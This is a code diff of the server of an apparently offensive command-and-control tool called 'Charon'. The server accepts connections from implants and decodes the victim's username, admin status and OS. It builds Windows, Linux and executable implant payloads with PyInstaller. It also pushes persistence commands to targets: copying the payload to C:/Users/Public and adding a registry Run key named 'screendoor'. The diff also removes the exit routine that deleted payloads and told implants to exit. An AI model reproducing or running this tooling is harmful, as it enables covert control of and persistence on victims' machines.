@@ -14,6 +14,7 @@ from Config.design import *
 from Config.commands import *
 
 
+
 def comm_in(targ_id):
     """
     Accepts connection from implants
@@ -100,11 +101,11 @@ def target_comm(targ_id, targets, num):
                 payload_name = input(Fore.BLUE + "[i] Enter Payload Name to Persist: " + Style.RESET_ALL)
                 if targets[num][6] == 1:
                     # Command 1
-                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
+                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:/Users/Public'
                     targ_id.send(persist_command_1.encode())
                     # Command 2
-                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion' \
-                                        f'\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
+                    persist_command_2 = f'reg add HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion' \
+                                        f'/Run -v screendoor /t REG_SZ /d C:/Users/Public/{payload_name}'
                     targ_id.send(persist_command_2.encode())
 
                     # Always keep a command to clean up endpoints after an engagement
@@ -158,13 +159,13 @@ def comm_handler():
 
             # Receive Username
             username = remote_target.recv(1024).decode()  # - 1
-            username = base64.b64decode(username).decode()
+            username = base64.b64decode(username).decode()  # encoding
 
             admin = remote_target.recv(1024).decode()  # - 2
-            admin = base64.b64decode(admin).decode()
+            admin = base64.b64decode(admin).decode()  # encoding
 
             op_sys = remote_target.recv(4096).decode()  # - 3
-            op_sys = base64.b64decode(op_sys).decode()
+            op_sys = base64.b64decode(op_sys).decode()  # encoding
 
             # Check if user is admin
             # Windows
@@ -238,10 +239,10 @@ def winplant():
 
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
-    generated = f'Generated Payloads\\{file_name}'
+    generated = f'Generated Payloads/{file_name}'
 
     if os.path.exists(r'Implants\winplant.py'):
-        shutil.copy('Implants\\winplant.py', generated)
+        shutil.copy('Implants/winplant.py', generated)
     else:
         error("File Not Found - winplant.py")
 
@@ -273,9 +274,9 @@ def linplant():
 
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
-    generated = f'Generated Payloads\\{file_name}'
+    generated = f'Generated Payloads/{file_name}'
 
-    if os.path.exists(f'Implants\\linplant.py'):
+    if os.path.exists(f'Implants/linplant.py'):
         shutil.copy('Implants/linplant.py', generated)
     else:
         error("File Not Found - linplant.py")
@@ -309,10 +310,10 @@ def exeplant():
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
     exe_file = f'{ran_name}.exe'
-    generated = f'Generated Payloads\\{file_name}'
+    generated = f'Generated Payloads/{file_name}'
 
-    if os.path.exists(f'Implants\\winplant.py'):
-        shutil.copy('Implants\\winplant.py', generated)
+    if os.path.exists(f'Implants/winplant.py'):
+        shutil.copy('Implants/winplant.py', generated)
     else:
         error("File Not Found - winplant.py")
 
@@ -341,17 +342,20 @@ def exeplant():
         error(f"Error occurred during payload generation")
 
     # PyInstaller Command Handling
-    pyinstaller_exec = f'pyinstaller "Generated Payloads\\{file_name}" -w --clean --onefile --distpath .'
+    pyinstaller_exec = f'pyinstaller "Generated Payloads/{file_name}" -w --clean --onefile --distpath .'
     process(f"Generating Executable {exe_file}...")
-    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
+    subprocess.call(pyinstaller_exec, shell=True, stderr=subprocess.DEVNULL)
     os.remove(f'{ran_name}.spec')
     shutil.rmtree('build')
-    os.replace(f'{exe_file}', f'Generated Payloads\\{exe_file}')
-    if os.path.exists(f'Generated Payloads\\{ran_name}.exe'):
-        success(f"Executable Generated to Generated Payloads Directory: {exe_file}")
+    os.replace(f'{exe_file}', f'Generated Payloads/{exe_file}')
+    try:
+        if os.path.exists(f'Generated Payloads/{ran_name}.exe'):
+            success(f"Executable Generated to Generated Payloads Directory: {exe_file}")
 
-    else:
-        error(f"Executable Generation Failed")
+        else:
+            error(f"Executable Generation Failed")
+    except FileNotFoundError:
+        error("Executable Generation Failed")
 
 
 # Powershell Cradle
@@ -407,46 +411,38 @@ if __name__ == "__main__":
         try:
             command = input(Fore.LIGHTMAGENTA_EX + f"Charon@{host_ip}$ " + Style.RESET_ALL)
 
-            # Help Menu
-            if command == 'help' or command == 'h':
-                help()
+            match command:
+                case ('help' | 'h'):
+                    help()
+                case ('clear' | 'cls'):
+                    clear()
+                case ('listeners -g' | 'listeners --generate'):
+                    host_ip = input(Fore.BLUE + "[i] Enter Listener IP: " + Style.RESET_ALL)
+                    host_port = input(Fore.BLUE + "[i] Enter Listener Port: " + Style.RESET_ALL)
+                    listener_handler()
+                    listener_counter += 1
 
-            if command == 'clear' or command == 'cls':
-                clear()
+                case ('pshell_shell'):
+                    pshell_cradle()
+                case 'winplant.py':
+                    if listener_counter > 0:
+                        winplant()
+                    else:
+                        error("Generate Listener First")
 
-            # Generate Listener Command
-            if command == 'listeners -g' or command == 'listeners --generate':
-                host_ip = input(Fore.BLUE + "[i] Enter Listener IP: " + Style.RESET_ALL)
-                host_port = input(Fore.BLUE + "[i] Enter Listener Port: " + Style.RESET_ALL)
-                listener_handler()
-                listener_counter += 1
+                case 'linplant.py':
+                    if listener_counter > 0:
+                        linplant()
+                    else:
+                        error("Generate Listener First")
 
-            # Payload Generation Function Calls
-
-            # Powershell Payload
-            if command == 'pshell_shell':
-                pshell_cradle()
-
-            # Windows Payload
-            if command == 'winplant.py':
-                if listener_counter > 0:
-                    winplant()
-                else:
-                    error("Generate Listener First")
-
-            # Linux Payload
-            if command == 'linplant.py':
-                if listener_counter > 0:
-                    linplant()
-                else:
-                    error("Generate Listener First")
-
-            # Executable Payload
-            if command == 'exeplant.py':
-                if listener_counter > 0:
-                    exeplant()
-                else:
-                    error("Generate Listener First")
+                case 'exeplant.py':
+                    if listener_counter > 0:
+                        exeplant()
+                    else:
+                        error("Generate Listener First")
+                case ('exit' | 'quit'):
+                    exit()
 
             # Generate Sessions Commands
             if command.split(" ")[0] == 'sessions':
@@ -510,29 +506,7 @@ if __name__ == "__main__":
                     except NameError:
                         continue
 
-            # Exit Command
-            if command == 'exit':
-                quit_message = input(
-                    Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
-                if quit_message == 'y' or quit_message == 'yes':
-                    # Delete Payloads
-                    process("Deleting Payloads")
-                    try:
-                        if os.path.exists('Generated Payloads'):
-                            shutil.rmtree('Generated Payloads')
-                    except PermissionError:
-                        break
-                    tar_length = len(targets)
-                    for target in targets:
-                        if target[7] == 'Dead':
-                            pass
-                        else:
-                            comm_out(target[0], 'exit')
-                    kill_flag = 1
-                    if listener_counter > 0:
-                        sock.close()
-                    quit("Quitting...")
-                    break
+
 
         except KeyboardInterrupt:
             quit_message = input(
